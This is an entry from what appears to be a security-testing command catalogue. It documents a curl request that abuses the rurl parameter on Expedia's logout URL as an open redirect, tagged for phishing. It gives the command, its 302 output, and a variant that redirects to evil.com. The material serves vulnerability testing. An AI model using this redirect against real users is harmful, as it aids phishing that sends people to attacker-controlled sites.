---
id: cmd-curl-malicious-logout
data: >-
  curl -X GET
  "https://www.expedia.com/?logout=1&rurl=https://qx4lw1nsec.blogspot.com/" -v
tags:
  - open-redirect
  - phishing
type: command
output: |-
  HTTP/2 302 
  Location: https://qx4lw1nsec.blogspot.com/
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:34.933Z'
verified: false
validated: true
submitted: true
---
# curl-malicious-logout

## Command

```bash
curl -X GET "https://www.expedia.com/?logout=1&rurl=https://qx4lw1nsec.blogspot.com/" -v
```

## Description

Tests malicious redirect by appending rurl parameter to Expedia logout URL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP GET method | Yes |
| `-v` | Verbose mode | Yes |
| `rurl` | Malicious URL parameter | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.expedia.com/?logout=1&rurl=https://qx4lw1nsec.blogspot.com/" -v
```

### Advanced Usage

```bash
curl -X GET "https://www.expedia.com/?logout=1&rurl=https://evil.com" -v -L
```

## Expected Output

302 redirect to the specified rurl, confirming open redirect.

## Related

- [[Related Procedure: Modify-Logout-URL-for-Malicious-Redirect]]
